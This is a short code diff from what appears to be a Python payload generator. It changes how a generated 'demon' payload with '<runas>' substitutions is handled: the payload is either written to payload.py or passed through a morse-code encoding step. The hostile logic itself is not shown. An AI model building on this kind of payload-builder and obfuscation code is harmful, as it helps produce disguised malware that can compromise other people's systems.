@@ -369,10 +369,9 @@ def encrypt_file(file_name, key):
         demon = demon.replace('<runas>', runas_def, 1)
         demon = demon.replace('<runas>', runas_check, 1)
 
-
-    with open('./payload.py', 'w') as f:
-        f.write(demon)
-        f.close()
-
-    if encoding == 'morse':
-        morse()
+    if mode == 1:
+        with open('./payload.py', 'w') as f:
+            f.write(demon)
+            f.close()
+    elif encoding == 'morse' and mode == 2:
+        morse(demon)
